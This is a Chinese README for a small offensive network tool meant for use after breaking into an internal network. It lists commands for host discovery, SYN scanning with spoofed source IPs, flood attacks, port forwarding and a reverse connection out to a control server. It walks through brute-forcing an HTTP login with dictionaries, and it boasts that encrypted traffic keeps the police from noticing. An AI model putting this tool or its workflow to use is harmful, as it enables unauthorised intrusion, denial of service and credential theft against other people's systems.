
scanner_framework

===

网络探测框架,适用于入侵到内网探测其它网络设备,探测器具有体积小,功能多,而且带有反向连接从内网穿透出外网连接控制终端,通信数据采用动态加密,再也不怕警察叔叔知道我在干坏事儿啦,为了方便破解一些弱口令设备,内部带有在线破解功能(暂时支持HTTP 破解).如果觉得这些功能满足不了需求,可以使用端口映射把你需要的工具直接通过隧道对接到内网的某台指定的主机端口上进行扫描..

***

###LCatro

***

###启动方式
scanner.exe 控制台启动<br/>
scanner.exe -bind [%port%] 绑定端口,远程访问<br/>
scanner.exe -recon %ip% [%port%] 反向连接,远程访问,默认是80 [WARNING! 记得先启动reverse_server ,不然scanner.exe 不能成功连接]<br/>

###使用方法
扫描当前网段存活的主机,并且自动搜集数据<br/>
using:arp<br/>
获取当前主机的网络信息<br/>
using:local<br/>
测试主机是否连通<br/>
using:ping %ip/host%<br/>
TCP SYN 扫描主机<br/>
using:scan %ip% [-P:[port1,port2,port3,...]] [-F:[fake_ip1,fake_ip2,...]]<br/>
洪水攻击主机<br/>
using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]<br/>
在线破解<br/>
using:crack %ip% %port% [%user_dictionary_path% %password_dictionary_path%]<br/>
路由跟踪<br/>
using:tracert %ip/host%<br/>
抓取页面<br/>
using:getpage %ip% [-PORT:%port%] [-PATH:%path%]<br/>
启动端口转发功能<br/>
using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]<br/>
显示帮助<br/>
using:help<br/>
退出<br/>
using:quit<br/>

###在线破解 crack
	在线破解功能原理是通过自己构造特定的HTTP 数据包然后程序根据字典穷举测试出帐号密码
	###什么是表达式?
	表达式的意思是给程序一个填充数据的框架,在接下来的穷举测试中会根据表达式内的关键字来填充数据,下面是在线破解的例子:
	
	本地网络192.168.1.103:80 启用了PHP 服务器,在探测器里面输入破解命令
	
	crack 192.168.1.103 80
	
	然后会提示输入表达式
	
	input your crack express:
	
	输入数据包数据:
	POST http://192.168.1.103:80/api/analays.php HTTP/1.1<br/>
	Accept: application/x-ms-application, image/jpeg, application/xaml+xml, image/gif, image/pjpeg, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<br/>
	Referer: http://192.168.1.103/api/analays.php<br/>
	Accept-Language: zh-CN<br/>
	User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)<br/>
	Content-Type: application/x-www-form-urlencoded<br/>
	Accept-Encoding: gzip, deflate<br/>
	Host: 192.168.1.103<br/>
	Content-length: %length%<br/>
	Pragma: no-cache<br/>
	<br/>
	user=%username%&pass=%password%<br/>
	
	其中Content-length: %length% 的意思是让程序自动在此填充上下文的大小[因为这个长度是会变化的],%username% 和%password% 就是自动填充用户名和密码[这里也可以不需要全部都用,比如破解水星路由器,直接填%password% 即可启动];最后输入<end>来确认数据包填写完成,如果中间某个位置出现填写错误就输入<reset>来重新填写破解数据包,下面的输入成功判断条件也是同理..
	
	input your check term:
	
	输入成功判断条件,由于经过测试,如果输入密码成功的话,页面会返回一个包含Success 的字符串,然后把他作为破解成功的测试条件
	Sucess
	
	now cracking!
	
	network crack - target:192.168.1.103:80
	username:root password:toor
	
	破解完成

###端口转发 route
	using:route -R:[%remote_ip%,%remote_port%] -L:[[%local_ip%,]%local_port%]<br/>
	

##Other
===
####reverse_server 是用来做反向连接用的服务端
####scanner.exe -bind 参数启动程序需要自己主动连过去,但是客户端还没写,也没什么需求,以后慢慢来..
